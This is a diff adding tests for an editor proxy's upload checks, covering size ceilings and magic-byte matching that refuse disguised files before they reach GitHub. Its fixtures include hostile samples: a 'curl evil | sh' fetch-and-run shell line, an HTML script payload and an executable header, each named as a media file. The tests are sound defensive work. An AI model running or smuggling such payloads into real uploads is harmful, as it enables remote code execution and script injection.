@@ -8,11 +8,12 @@
  *   POST /schedule, /suggestions, /source/revert, PATCH /api/v1/edits
  *
  * KLN-01: active document types (SVG, XML, XSL, XHTML…) never get through.
+ * KLN-02: uploads have a size ceiling and must hold what their name says.
  */
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import worker, { apiPageCandidates, apiPageFilter } from '../worker/index.js';
-import { FILE_MESSAGES } from '../src/file-policy.js';
+import { UPLOAD_MAX_BYTES, FILE_MESSAGES } from '../src/file-policy.js';
 import {
   REPO, SESSION, ORIGIN, editorEnv, fakeKV, withFetch, call, b64, jsonRes, githubWrites, SAMPLES, SVG_SCRIPT,
 } from './worker-harness.js';
@@ -90,6 +91,8 @@ test('KLN-01 proxy PUT: the last extension decides, in any letter case', async (
     assert.equal((await put(editorEnv(), 'assets/LOGO.SVG', SVG_SCRIPT)).status, 403);
     assert.equal((await put(editorEnv(), 'assets/photo.png.svg', SVG_SCRIPT)).status, 403);
     assert.equal((await put(editorEnv(), 'assets/photo.png.Svg', SVG_SCRIPT)).status, 403);
+    // Named like an image: now its bytes are what count (KLN-02).
+    assert.equal((await put(editorEnv(), 'assets/drawing.svg.png', SVG_SCRIPT)).json.code, 'file_mismatch');
     assert.equal(githubWrites(calls).length, 0);
   });
 });
@@ -398,6 +401,161 @@ test('KLN-01 /source/revert and /source/duplicate: XML documents are not editabl
       const d = await call(editorEnv(), 'POST', '/source/duplicate', { body: { repo: REPO, file } });
       assert.equal(d.status, 400, file);
     }
+    assert.equal(calls.length, 0);
+  });
+});
+
+// ─── KLN-02 · size ceiling and leading bytes ─────────────────────────────────
+
+test('KLN-02 proxy PUT: bytes that are not what the name says are refused (415), nothing reaches GitHub', async () => {
+  const cases = [
+    ['assets/uploads/photo.png', 'MZ\x90\x00 this is a program, not a picture'],
+    ['assets/uploads/photo.jpg', SVG_SCRIPT],
+    ['assets/files/report.pdf', '<html><script>alert(1)</script></html>'],
+    ['assets/fonts/brand.woff2', SAMPLES.zip],
+    ['assets/files/agenda.docx', SAMPLES.pdf],
+    ['assets/media/clip.mp4', '#!/bin/sh\ncurl evil | sh'],
+    ['assets/uploads/empty.png', ''],
+  ];
+  for (const [path, bytes] of cases) {
+    await withFetch(acceptAll(), async (calls) => {
+      const r = await put(editorEnv(), path, bytes);
+      assert.equal(r.status, 415, path);
+      assert.equal(r.json.code, 'file_mismatch', path);
+      assert.equal(r.json.path, path);
+      assert.equal(githubWrites(calls).length, 0, path);
+    });
+  }
+});
+
+test('KLN-02 proxy PUT: every allowed upload type goes through when its bytes match', async () => {
+  const cases = { 'a.png': 'png', 'a.jpg': 'jpeg', 'a.gif': 'gif', 'a.webp': 'webp', 'a.avif': 'avif', 'favicon.ico': 'ico', 'a.pdf': 'pdf',
+    'a.woff2': 'woff2', 'a.ttf': 'ttf', 'a.mp3': 'mp3', 'a.mp4': 'mp4', 'a.webm': 'webm', 'a.wav': 'wav', 'a.docx': 'zip', 'a.xlsx': 'zip' };
+  for (const [name, sample] of Object.entries(cases)) {
+    await withFetch(acceptAll(), async (calls) => {
+      const r = await put(editorEnv(), `assets/files/${name}`, SAMPLES[sample]);
+      assert.equal(r.status, 201, name);
+      assert.equal(githubWrites(calls).length, 1, name);
+    });
+  }
+});
+
+test('KLN-02 proxy PUT: 15 MB is the ceiling — one byte over is a 413, exactly 15 MB goes through', async () => {
+  const png = (n) => { const b = Buffer.alloc(n, 0); Buffer.from(SAMPLES.png).copy(b, 0, 0, 8); return b; };
+  await withFetch(acceptAll(), async (calls) => {
+    const over = await put(editorEnv(), 'assets/uploads/huge.png', png(UPLOAD_MAX_BYTES + 1));
+    assert.equal(over.status, 413);
+    assert.equal(over.json.code, 'file_size');
+    assert.equal(over.json.error, 'That file is too big. The limit is 15 MB.');
+    assert.equal(githubWrites(calls).length, 0);
+    const at = await put(editorEnv(), 'assets/uploads/big.png', png(UPLOAD_MAX_BYTES));
+    assert.equal(at.status, 201);
+    assert.equal(githubWrites(calls).length, 1);
+  });
+});
+
+test('KLN-02 proxy: a body over the transport cap is refused before it is parsed — by Content-Length, or as it streams', async () => {
+  await withFetch(acceptAll(), async (calls) => {
+    // Declared too large: refused on the header alone.
+    const declared = await call(editorEnv(), 'PUT', `/gh/repos/${REPO}/contents/assets/a.png`, { body: '{}', headers: { 'Content-Length': String(40 * 1024 * 1024) } });
+    assert.equal(declared.status, 413);
+    assert.equal(declared.json.code, 'file_size');
+    // No length declared: the read stops once the cap is passed.
+    let sent = 0;
+    const chunk = new Uint8Array(1024 * 1024).fill(0x41);
+    const stream = new ReadableStream({ pull(c) { if (sent++ < 64) c.enqueue(chunk); else c.close(); } });
+    const res = await worker.fetch(new Request(`https://worker.example/gh/repos/${REPO}/git/blobs`, {
+      method: 'POST', body: stream, duplex: 'half', headers: { 'X-Kiln-Session': SESSION, Origin: ORIGIN } }), editorEnv());
+    assert.equal(res.status, 413);
+    assert.ok(sent < 40, `stopped reading early (pulled ${sent} MB of 64)`);
+    assert.equal(calls.length, 0);
+  });
+});
+
+test('KLN-02 git/blobs: a blob over the ceiling is refused when it is created (base64 or text)', async () => {
+  const blob = (body) => call(editorEnv(), 'POST', `/gh/repos/${REPO}/git/blobs`, { body });
+  await withFetch(acceptAll(), async (calls) => {
+    const big = await blob({ content: Buffer.alloc(UPLOAD_MAX_BYTES + 1, 1).toString('base64'), encoding: 'base64' });
+    assert.equal(big.status, 413);
+    assert.equal(big.json.error, FILE_MESSAGES.size);
+    const text = await blob({ content: 'é'.repeat(UPLOAD_MAX_BYTES / 2 + 1), encoding: 'utf-8' });   // 2 bytes each
+    assert.equal(text.status, 413);
+    assert.equal(githubWrites(calls).length, 0);
+    assert.equal((await blob({ content: Buffer.from(SAMPLES.png).toString('base64'), encoding: 'base64' })).status, 201);
+    assert.equal((await blob({ content: PAGE, encoding: 'utf-8' })).status, 201);
+  });
+});
+
+test('KLN-02 git-data commit: real uploads go through — images, a PDF, a Word file — reading only their first bytes', async () => {
+  const after = [...SITE,
+    { path: 'assets/uploads/img-abc.webp', bytes: Buffer.concat([Buffer.from(SAMPLES.webp), Buffer.alloc(5000, 3)]) },
+    { path: 'assets/uploads/master-abc.webp', bytes: SAMPLES.png },          // PNG bytes under .webp: same family
+    { path: 'assets/files/minutes.pdf', bytes: SAMPLES.pdf },
+    { path: 'assets/files/agenda.docx', bytes: SAMPLES.zip }];
+  await withFetch(gitRepo({ before: SITE, after }), async (calls) => {
+    const r = await commit(editorEnv());
+    assert.equal(r.status, 201);
+    assert.equal(commitsMade(calls).length, 1);
+    assert.equal(commitsMade(calls)[0].body.author.name, 'Sam (via Kiln)');
+    const reads = calls.filter(c => /\/git\/blobs\//.test(c.url));
+    assert.equal(reads.length, 4);
+    for (const c of reads) assert.match(String(c.headers.Accept), /vnd\.github\.raw/);
+  });
+});
+
+test('KLN-02 git-data commit: an oversized file is refused from the tree listing, without downloading it', async () => {
+  const after = [...SITE, { path: 'assets/files/huge.pdf', bytes: SAMPLES.pdf }];
+  await withFetch(gitRepo({ before: SITE, after, sizes: { 'assets/files/huge.pdf': UPLOAD_MAX_BYTES + 1 } }), async (calls) => {
+    const r = await commit(editorEnv());
+    assert.equal(r.status, 413);
+    assert.equal(r.json.code, 'file_size');
+    assert.equal(r.json.path, 'assets/files/huge.pdf');
+    assert.equal(calls.filter(c => /\/git\/blobs\//.test(c.url)).length, 0);
+    assert.equal(commitsMade(calls).length, 0);
+  });
+});
+
+test('KLN-02 git-data commit: a staged upload whose bytes do not match its name is refused', async () => {
+  for (const [path, bytes] of [['assets/uploads/img-x.webp', SVG_SCRIPT], ['assets/files/report.pdf', '<html><script>x</script>'], ['assets/uploads/a.png', '']]) {
+    await withFetch(gitRepo({ before: SITE, after: [...SITE, { path, bytes }] }), async (calls) => {
+      const r = await commit(editorEnv());
+      assert.equal(r.status, 415, path);
+      assert.equal(r.json.code, 'file_mismatch', path);
+      assert.equal(commitsMade(calls).length, 0, path);
+    });
+  }
+});
+
+test('KLN-02 git-data commit: works the same if GitHub answers a blob read with its JSON envelope', async () => {
+  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'assets/uploads/a.png', bytes: SAMPLES.png }], rawSupported: false }), async (calls) => {
+    assert.equal((await commit(editorEnv())).status, 201);
+    assert.equal(commitsMade(calls).length, 1);
+  });
+  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'assets/uploads/a.png', bytes: SVG_SCRIPT }], rawSupported: false }), async (calls) => {
+    assert.equal((await commit(editorEnv())).status, 415);
+    assert.equal(commitsMade(calls).length, 0);
+  });
+});
+
+test('KLN-02 git-data commit: fails closed when a file cannot be checked', async () => {
+  const after = [...SITE, { path: 'assets/uploads/a.png', bytes: SAMPLES.png }];
+  await withFetch(gitRepo({ before: SITE, after, failBlob: 'all' }), async (calls) => {
+    const r = await commit(editorEnv());
+    assert.equal(r.status, 502);
+    assert.equal(commitsMade(calls).length, 0);
+  });
+  await withFetch(gitRepo({ before: SITE, after: [...SITE, { path: 'assets/uploads/a.png', bytes: SAMPLES.png, noSize: true }] }), async (calls) => {
+    assert.equal((await commit(editorEnv())).status, 502);
+    assert.equal(commitsMade(calls).length, 0);
+  });
+});
+
+test('KLN-02 the owner is not behind the proxy: a GitHub token is not an editor session', async () => {
+  // Admins write to api.github.com directly. The proxy only ever serves editor
+  // sessions, so nothing here can gate (or be bypassed by) an owner's token.
+  await withFetch(acceptAll(), async (calls) => {
+    const r = await call(editorEnv(), 'PUT', `/gh/repos/${REPO}/contents/logo.svg`, { session: null, headers: { Authorization: 'Bearer owner-token' }, body: { content: b64(SVG_SCRIPT) } });
+    assert.equal(r.status, 401);
     assert.equal(calls.length, 0);
   });
 });
